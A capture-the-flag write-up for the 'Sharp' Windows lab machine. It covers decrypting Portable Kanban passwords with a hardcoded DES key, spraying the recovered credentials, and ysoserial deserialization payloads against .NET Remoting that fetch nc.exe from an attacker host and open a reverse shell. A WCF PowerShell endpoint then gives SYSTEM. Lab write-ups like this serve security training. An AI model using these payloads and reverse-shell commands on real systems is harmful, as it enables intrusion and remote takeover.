@@ -1,0 +1,258 @@
+Sharp
+
+27th April 2021 / Document No D21.100.116
+Prepared By: MrR3boot
+Machine Creator(s): cube0x0
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Sharp is a hard difficulty Windows machine which features .NET remoting services. Reversing a software
+accessible from open SMB share reveals user credentials. These credentials can be used to access a .NET
+remoting services application, which can be later downloaded from a private SMB share. By exploiting this
+service it is possible to get a foothold on the server. WCF service project is accessible and service can be
+exploited to gain root access on the system.
+
+Skills Required
+
+      Enumeration
+      Scripting
+      Basic Knowledge of Windows
+
+Skills Learned
+
+      Reversing .NET Applications
+      Exploitation of .NET Remoting Services
+      Exploitation of WCF Remoting Services
+Enumeration
+
+Nmap
+
+We can start by running a full nmap scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.219 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.219
+
+Tool nmap reveals that the target host is a Windows system that features SMB, WinRM, StorageCraft Image
+Manager, .NET Message Framing services running on their default ports.
+
+SMB
+
+Let's check if the SMB server allows null sessions using smbmap tool.
+It is possible to connect successfully and discover that the guest user has read access to the kanban
+share. We can now attempt to recursively list it's contents.
+
+There are plenty of files present and we can download all of them from the share using the tool smbget for
+an offline analysis.
+Portable Kanban
+
+The file names and the folder name made us to believe that this might be an installation of Portable
+Kanban software. This software is used to create and manage tasks. Running file command on
+executable PortableKanban.exe reveals that this software is built with the .Net programming language.
+
+The file PortableKanban.pk3 though contains encrypted passwords of Administrator and lars users.
+There's also a backup file present which includes the same encrypted passwords.
+
+We transfer PortableKanban.exe and PortableKanban.Data.dll files locally to a Windows machine and
+open them with the dnspy tool for further analysis. We search for the encryptedpassword string.
+We notice few matches from the DLL file PortableKanban.Data.dll which has a class called Crypto that
+includes Encrypt and Decrypt functions.
+
+We can review the reversed engineered Decrypt function code.
+
+   public static string Decrypt(string cryptedString)
+   {
+
+      string result;
+      try
+      {
+
+          if (string.IsNullOrEmpty(cryptedString))
+          {
+
+              result = string.Empty;
+          }
+          else
+          {
+
+              DESCryptoServiceProvider descryptoServiceProvider = new
+   DESCryptoServiceProvider();
+
+              result = new StreamReader(new CryptoStream(new
+   MemoryStream(Convert.FromBase64String(cryptedString)),
+   descryptoServiceProvider.CreateDecryptor(Crypto._rgbKey, Crypto._rgbIV),
+   CryptoStreamMode.Read)).ReadToEnd();
+
+          }
+      }
+      catch (Exception)
+      {
+
+          result = string.Empty;
+      }
+      return result;
+   }
+The code uses an encrypted string as input then decodes the base64 content. We also understand that it is
+using the DES algorithm with hardcoded key and iv values to decrypt the contents. Selecting the
+_rgbKey can reveal the values for Key and IV .
+
+We develeop a custom python script to decrypt the passwords.
+   import json
+   import base64
+   from des import *
+   data = json.loads(open('PortableKanban.pk3','r').read()[1:])
+   for i in data['Users']:
+      passwd = base64.b64decode(i["EncryptedPassword"])
+      p = DesKey(b'7ly6UznJ')
+      passwd = p.decrypt(passwd, initial=b"XuVUm5fR", padding=True)
+      print(f"[+] {i['Name']} : {passwd.decode('utf-8')}")
+
+By using the crackmapexec tool one can spray these credentials on different services. Let's issue the below
+command to check if the credentials are valid against the WinRM service.
+
+   crackmapexec winrm 10.10.10.219 -u users.txt -p password.txt
+The attack was not successful but we can try them for the SMB service.
+
+We discover that user lars can authenticate to the target SMB service. It is possible to list the shares using
+lars / G123HHrth234gRG credentials.
+Now we have access to the files inside the dev share.
+Finally we download them using the smbget command.
+We onserve that the file notes.txt reveals some information about a todo list.
+Foothold
+
+Running the file command reveals that these executables are built with the .NET programming
+language. We can transfer those files locally to a Windows virtual machine and open using the dnspy tool
+for further analysis.
+
+File Server.exe has a StartServer class which implements .NET Remoting service on port 8888 while
+also exposes the SecretSharpDebugApplicationEndpoint object instance. File Client.exe in it's Main
+method reveals credentials that required to access the .NET remoting object instance.
+
+   private static void Main(string[] args)
+   {
+
+      ChannelServices.RegisterChannel(new TcpChannel(), true);
+      IDictionary channelSinkProperties =
+   ChannelServices.GetChannelSinkProperties((Remoting)Activator.GetObject(typeof(Remoting)
+   , "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"));
+      channelSinkProperties["username"] = "debug";
+      channelSinkProperties["password"] = "SharpApplicationDebugUserPassword123!";
+   }
+
+.NET Remoting
+
+.NET Remoting is an API designed to manage inter-process communication (IPC). It allows a developer to
+expose .NET object instances to remote clients either through TCP/IP or between users on the same
+machine over common inter-process communication mechanisms.
+
+   private static void StartServer()
+   {
+
+      Hashtable hashtable = new Hashtable();
+      ((IDictionary)hashtable)["port"] = 8888;
+      ((IDictionary)hashtable)["rejectRemoteRequests"] = false;
+      BinaryServerFormatterSinkProvider binaryServerFormatterSinkProvider = new
+   BinaryServerFormatterSinkProvider();
+      binaryServerFormatterSinkProvider.TypeFilterLevel = TypeFilterLevel.Full;
+      ChannelServices.RegisterChannel(new TcpChannel(hashtable, new
+   BinaryClientFormatterSinkProvider(), binaryServerFormatterSinkProvider), true);
+      RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;
+      RemotingConfiguration.RegisterWellKnownServiceType(typeof(Remoting),
+   "SecretSharpDebugApplicationEndpoint", WellKnownObjectMode.Singleton);
+      Console.WriteLine("Registered service");
+      for (;;)
+      {
+
+          Console.ReadLine();
+      }
+   }
+The service uses binary serialization and we notice that TypeFilterLevel is set to Full . Microsoft's
+documentation decribes that when the level of deserialization is Full then automatic deserialization of all
+types is supported .
+
+   .NET Framework remoting provides two levels of automatic deserialization, Low and Full.
+   The Full deserialization level supports automatic deserialization of all types that
+   remoting supports in all situations.
+By further investigating online, we spot a git repository which indeed offers an exploit for this service.
+
+We download the repository and open the ExploitRemotingService.sln file in Visual Studio. We build the
+solution and the created ExploitRemotingService.exe file assist us in order to send a raw base64
+serialized object to the server.
+We can use the ysoserial tool to also build the payload to verify the vulnerability.
+
+   ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "curl 10.10.14.3"
+The above command produces a base64 encoded serialized payload. We will use a python web server to
+confirm that we can get the request from the curl command and issue the below exploitation command
+replacing though the <base64> part with the actual payload which it was generated just before.
+
+   ExploitRemotingService.exe -s --user=debug --
+   pass="SharpApplicationDebugUserPassword123!"
+   tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <base64>
+This is indeed successful. The command was executed and reached our web server. Now it's time to repeat
+the whole process to download the nc.exe tool and then execute it in order to get a reverse shell.
+
+   ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "curl
+   10.10.14.3/nc.exe -o c:\windows\temp\nc.exe"
+   ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c
+   "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.3 1234"
+Privilege Escalation
+
+By having foothold on the machine we can try enumerate the server. Checking user lars directories we
+notice a wcf folder in the Documents directory.
+
+This folder contains a Visual Studio project. We create an archive from these files so that we can transfer it
+to our local machine for offline analysis.
+
+   powershell -ep bypass
+   Compress-Archive -Path C:\Users\lars\Documents\wcf -DestinationPath c:\dev\wcf.zip
+Now the wcf.zip file can be downloaded from the dev share.
+   net use G: \\10.10.10.219\dev /user:lars G123HHrth234gRG
+   copy G:\wcf.zip c:\htb\wcf.zip
+We extract the archive and open the project solution in Visual Studio. Inspecting Server/Program.cs class
+reveals that it implements a WcFService . Windows Communication Foundation (WCF) is a framework
+which is used to build service oriented applications.
+The OnStart class reveals the WCF service endpoint which we can use to send data as asynchronous
+messages.
+
+...
+
+Uri baseAddress = new Uri("net.tcp://0.0.0.0:8889/wcf/NewSecretWcfEndpoint");
+
+serviceHost = new ServiceHost(typeof(Remoting), baseAddress);
+
+NetTcpBinding binding = new NetTcpBinding();
+
+binding.Security.Mode = SecurityMode.Transport;
+
+binding.Security.Transport.ClientCredentialType = TcpClientCredentialType.Windows;
+
+binding.Security.Transport.ProtectionLevel       = ProtectionLevel.EncryptAndSign;
+
+binding.Security.Message.ClientCredentialType = MessageCredentialType.Windows;
+
+...
+
+Client uses the IWcFService interface to connect to the WCF service endpoint.
+We can select IWcfService and then Go To Definition option to explore the functions defined in this
+interface.
+
+There are few functions defined but InvokePowerShell looks promising. This function accepts user input
+then it simply executes it using PowerShell.
+
+We can modify Client/Program.cs as below to execute the whoami command.
+Finally we build the solution and run WcfClient.exe from the Client folder.
+
+Our try didn't have any success and this probably happened due to the use of authentication. It is possible
+though to overcome this by either transferring WcfClient.exe and WcfRemotingLibrary.dll files to the
+server or by creating a netonly PowerShell session. We can try with the netonly session by issuing the
+below command.
+
+   runas /netonly /user:lars powershell
+After supplying the password it spawns a new PowerShell window. Now we can run WcfClient.exe .
+
+This is indeed a successful attack. With a similar way, it is possible to obtain a reverse shell using the
+following code for Client .
+
+We use a nc64 listener on port 1234 and run WcfClient.exe in netonly PowerShell session.
+Finally this attack is successful and we receive a shell as nt authority\system .
+
